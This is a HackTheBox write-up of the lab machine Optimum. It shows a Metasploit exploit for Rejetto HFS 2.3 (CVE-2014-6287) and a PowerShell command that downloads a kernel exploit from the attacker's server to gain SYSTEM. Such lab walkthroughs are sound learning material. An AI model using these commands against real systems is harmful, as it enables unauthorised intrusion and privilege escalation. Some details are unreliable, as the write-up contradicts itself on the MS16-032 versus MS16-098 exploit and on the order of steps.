---
title: HTB · Optimum
slug: htb-optium
date: 2026-08-17
image: optimum
platform: HackTheBox
os: Windows
difficulty: Easy
points: 450
tags: [hackthebox, windows, easy, retired, metasploit, cve-2014-6287, http-file-server]
description: Optimum is an easy-difficulty Windows machine on Hack The Box focused on exploiting known CVEs. It centers on gaining a foothold through a vulnerable HttpFileServer (Rejetto HFS) and escalating privileges via a Windows kernel exploit (MS16-032).
featured: true
---

# Reconnaissance
## Nmap Scanning 
```bash
nmap -A -p- -T4 -sV -Pn 10.129.65.57 -oN nmap.txt
```
### Initial Scan Results
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
# Exploitation
Nmap reveals just one open service, which is HttpFileServer version 2.3. A bit of searching
reveals that this particular version has a remote command execution vulnerability
(CVE-2014-6287). And that vulnerability happens to have a Metasploit module available so i will exploit it with metaspoit. [POC](https://www.exploit-db.com/exploits/39161)
```bash
use exploit/windows/http/rejetto_hfs_exec
set rhost 10.129.65.57
set lhost 10.10.14.12
set lport 80
run

getuid
shell
```
We can find the user flag on c:\Documents and Settings\kostas\Desktop\user.txt
# Privilege Escalation
Let's first run `sysinfo` to get a little more information about the system.
In this case we see a heavily outdated version of the Operating System that we could abuse, Microsoft Windows Server 2012 R2 Standard - 6.3.9600.
This version of the OS is vulnerable to the [MS16-098 exploit](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/41020.exe).
I'll just run a python one liner web shell to transfer it to the windows machine.
```bash
python3 -m http.server 8080
```
And run this on the windows machine
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.12:8080/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```
Now I have the exploit in `C:\Users\Public\Downloads\41020.exe`.
```powershell
whoami
nt authority\system
```
And after running `41020.exe` we are administrator and can get the root flag in this directory.
```powershell
c:\Users\Administrator\Desktop>type root.txt
```
